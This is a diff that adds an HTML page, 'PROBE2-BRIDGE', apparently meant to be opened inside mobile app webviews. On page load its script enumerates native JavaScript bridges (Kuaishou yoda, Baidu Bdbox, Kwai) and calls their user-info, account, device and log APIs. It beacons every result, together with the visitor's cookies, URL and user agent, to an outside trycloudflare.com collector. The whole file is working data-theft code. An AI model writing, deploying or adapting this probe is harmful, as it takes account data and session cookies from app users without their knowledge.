@@ -1,0 +1,84 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>P2</title>
+<style>body{font-family:monospace;font-size:13px;word-break:break-all;margin:6px;background:#111;color:#0f0}pre{white-space:pre-wrap;margin:2px 0;font-size:11px}.tag{color:#0ff;font-weight:bold}h1{color:#ff0;font-size:20px;margin:2px 0}</style>
+</head>
+<body>
+<h1>PROBE2-BRIDGE</h1>
+<pre id="out">starting...</pre>
+<script>
+var COLLECTOR = 'https://waters-finances-wrestling-marked.trycloudflare.com';
+var LOG = [];
+function out(s){ LOG.push(s); document.getElementById('out').textContent = LOG.join('\n').substring(0,3500); }
+function report(tag, data){
+  var p = {page:'probe2', tag:tag, url:location.href, data:data, ua:navigator.userAgent, cookie:document.cookie};
+  var qs = encodeURIComponent(JSON.stringify(p));
+  try{ navigator.sendBeacon(COLLECTOR+'/b?d='+qs); }catch(e){}
+  try{ new Image().src = COLLECTOR+'/i?d='+qs; }catch(e){}
+}
+function safe(fn, name){ try{ return fn(); }catch(e){ out('ERR '+name+': '+e); return undefined; } }
+
+setTimeout(function(){
+  out('url: '+location.href);
+
+  // 1) enumerate every non-window bridge-like global deeply
+  var re = /bridge|jsb|native|hybrid|yoda|bdbox|bd|kwai|applet|webview/i;
+  var found = [];
+  safe(function(){
+    for (var k in window){
+      if (re.test(k) && k !== 'window'){
+        var v = window[k], t = typeof v;
+        var detail = t;
+        if (v && (t==='object'||t==='function')){
+          var keys = [];
+          try{ keys = Object.keys(v).slice(0,40); }catch(e){}
+          detail = t + '{' + keys.join(',') + '}';
+          // one level deeper for nested objects that look like namespaces
+          for (var kk in keys.slice(0,15)){
+            try{
+              var sub = v[keys[kk]];
+              if (sub && typeof sub==='object') detail += ' | '+keys[kk]+'{'+Object.keys(sub).slice(0,20).join(',')+'}';
+            }catch(e){}
+          }
+        }
+        found.push(k+' : '+detail);
+      }
+    }
+  }, 'enum');
+  out('bridges:\n'+ (found.join('\n') || '(none)'));
+  report('bridge-enum', found);
+
+  // 2) try read-only bridge calls — Kuaishou yoda
+  var yoda = window.__yodaBridge__;
+  if (yoda){
+    ['getAppInfo','getUserInfo','getDeviceInfo','getCommonParameters','getLogData','app.getInfo','user.getUserInfo'].forEach(function(api){
+      safe(function(){
+        var r = yoda.invoke(api, {}, function(res){ out('yoda '+api+' cb: '+JSON.stringify(res)); report('yoda-cb-'+api, res); });
+        if (r !== undefined){ out('yoda '+api+' sync: '+JSON.stringify(r)); report('yoda-sync-'+api, r); }
+      }, 'yoda-'+api);
+    });
+  }
+
+  // 3) Baidu Bdbox
+  var bd = window.Bdbox_android_jsbridge;
+  if (bd){
+    safe(function(){ out('bd keys: '+Object.keys(bd).join(',')); }, 'bd-keys');
+    ['account.getInfo','common.getInfo','app.getInfo','user.getUserInfo','device.getInfo','getLogParams','getBoxInfo'].forEach(function(api){
+      safe(function(){
+        var r = bd.dispatch(api, {}, function(res){ out('bd '+api+' cb: '+JSON.stringify(res)); report('bd-cb-'+api, res); });
+        if (r !== undefined){ out('bd '+api+' sync: '+JSON.stringify(r)); report('bd-sync-'+api, r); }
+      }, 'bd-'+api);
+    });
+  }
+
+  // 4) generic prompts other common bridges
+  [{b:window.Kwai, m:'getUserId'},{b:window._KwaiBridge_, m:'getUserId'}].forEach(function(x){
+    if (x.b && x.b[x.m]) safe(function(){ out('generic '+x.m+': '+JSON.stringify(x.b[x.m]())); }, 'gen');
+  });
+
+  out('done t='+Date.now());
+  report('done', {log: LOG.slice(0,60)});
+}, 300);
+</script>
+</body>
+</html>
